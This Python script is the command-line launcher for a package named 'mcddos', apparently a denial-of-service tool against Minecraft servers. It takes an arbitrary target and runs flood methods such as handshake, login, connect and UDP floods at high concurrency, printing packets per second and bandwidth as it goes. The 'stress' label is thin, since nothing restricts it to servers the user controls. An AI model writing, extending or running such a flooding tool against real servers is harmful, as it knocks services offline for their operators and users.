#!/usr/bin/env python3
"""Standalone CLI - no browser needed."""
import argparse
import asyncio
import sys

from mcddos.engine import Attack


async def main():
    p = argparse.ArgumentParser(description="MC stress CLI")
    p.add_argument("target")
    p.add_argument("-p", "--port", type=int, default=None)
    p.add_argument("-m", "--method", default="status",
                   choices=["status", "handshake", "login", "connect", "mixed",
                            "bedrock", "udp", "udpmix"])
    p.add_argument("-c", "--concurrency", type=int, default=300)
    p.add_argument("-d", "--duration", type=int, default=60)
    p.add_argument("-t", "--timeout", type=float, default=5.0)
    p.add_argument("--hold", type=float, default=0.0)
    a = p.parse_args()

    atk = Attack(a.target, a.port, a.method, a.concurrency, a.duration, a.timeout, a.hold)
    host, port = await atk.resolve()
    print(f"target  : {host}:{port}  method={a.method}  conc={atk.concurrency}  dur={a.duration}s")
    print("-" * 62)

    task = asyncio.create_task(atk.run())
    try:
        while not task.done():
            await asyncio.sleep(1)
            s = atk.stats
            print(f"\rpps {s.pps:>8.0f} | mbit {s.bps*8/1e6:>6.2f} | conns {s.conns:>7} "
                  f"| resp {s.responses:>6} | err {s.errors:>6}", end="", flush=True)
    except KeyboardInterrupt:
        await atk.stop()
    await task
    print("\n" + "-" * 62)
    print(f"done: {atk.stats.snapshot()}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)